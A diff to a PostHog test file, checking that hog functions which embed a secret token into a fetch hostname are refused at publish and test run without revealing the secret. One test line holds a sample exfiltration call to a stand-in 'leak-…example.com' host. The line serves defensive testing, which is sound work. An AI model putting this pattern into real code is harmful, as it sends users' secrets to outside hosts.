@@ -12,6 +12,7 @@ from posthog.models.utils import generate_random_token_personal, hash_key_value
 
 from products.cdp.backend.api.hog_function import HogFunctionViewSet
 from products.cdp.backend.api.test.secret_sender import (
+    LEAKABLE_SECRET,
     MOVED_DETAIL,
     MOVED_SENDER_HOG,
     MOVED_URL,
@@ -455,6 +456,12 @@ class TestHogFunctionDrafts(DraftTestCase):
             ),
             ("enters_an_empty_secret", {"token": {"value": ""}}, status.HTTP_400_BAD_REQUEST, "inputs__token"),
             (
+                "enters_a_number",
+                {"token": {"value": 5}},
+                status.HTTP_400_BAD_REQUEST,
+                "inputs__token__value",
+            ),
+            (
                 "enters_a_dictionary_for_a_text_secret",
                 {"token": {"value": {"Authorization": "entered at publish"}}},
                 status.HTTP_400_BAD_REQUEST,
@@ -604,6 +611,29 @@ class TestHogFunctionDrafts(DraftTestCase):
                 expected_detail,
             )
 
+    @parameterized.expand([("publish",), ("test_run",)])
+    def test_refusal_never_reveals_a_secret_built_into_the_host(self, path: str):
+        leaking_hog = "fetch(concat('https://leak-', inputs.token, '.example.com'));"
+        function_id = self._create(
+            hog=SENDER_HOG, inputs={"url": {"value": SENDER_URL}, "token": {"value": LEAKABLE_SECRET}}
+        )
+
+        with secret_host_binding_flag(True):
+            if path == "publish":
+                self._stage(function_id, {"hog": leaking_hog})
+                response = self._publish(function_id)
+            else:
+                configuration = {**BASE_FUNCTION, "hog": leaking_hog, "inputs": sender_inputs(SENDER_URL)}
+                response, _ = self._test_invoke(function_id, {"configuration": configuration})
+
+        assert response.status_code == status.HTTP_400_BAD_REQUEST, response.json()
+        assert LEAKABLE_SECRET not in response.json()["detail"].lower()
+        assert (response.json()["attr"], response.json()["detail"]) == (
+            "inputs__token",
+            "This change sends Token to an address built from Token. Until now it was only sent to hooks.example.com. "
+            "Enter it again to confirm.",
+        )
+
     @parameterized.expand([("live_edit", False), ("draft_test_run", True)])
     def test_rotating_one_secret_keeps_an_unbound_sibling(self, _name: str, staged: bool):
         sibling_schema = {"key": "event_token", "type": "string", "label": "Event token", "secret": True}
@@ -642,7 +672,8 @@ class TestHogFunctionDrafts(DraftTestCase):
         assert (response.json()["attr"], response.json()["code"], response.json()["detail"]) == (
             "inputs__token",
             "secret_reentry_required",
-            "This change sends Token to the address in Target. Until now it was only sent to the address in Target. "
+            "This change sends Token to an address built from Target. "
+            "Until now it was only sent to an address built from Target. "
             "Enter it again to confirm.",
         )
 
